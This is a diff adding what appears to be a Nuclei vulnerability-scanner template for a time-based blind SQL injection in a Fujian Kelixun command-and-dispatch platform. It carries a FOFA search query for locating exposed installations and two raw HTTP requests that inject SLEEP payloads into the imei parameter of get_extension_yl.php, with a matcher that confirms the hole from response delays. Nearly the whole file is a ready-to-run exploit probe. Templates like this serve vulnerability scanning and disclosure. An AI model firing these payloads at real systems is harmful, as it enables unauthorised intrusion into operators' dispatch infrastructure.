@@ -1,0 +1,27 @@
+id: zhdd-get_extension_yl-sqli
+
+info:
+  name: 福建科立讯通信-指挥调度平台-SQL注入-get_extension_yl
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: body="app/structure/departments.php" || app="指挥调度管理平台"
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /api/client/get_extension_yl.php?imei=1%27%20AND%20(SELECT%207545%20FROM%20(SELECT(SLEEP(4)))Zjzw)%20AND%20%27czva%27=%27czva&timestamp=1&sign=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+
+      - |
+        GET /api/client/get_extension_yl.php?imei=1%27%20AND%20(SELECT%207545%20FROM%20(SELECT(SLEEP(8)))Zjzw)%20AND%20%27czva%27=%27czva&timestamp=1&sign=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"
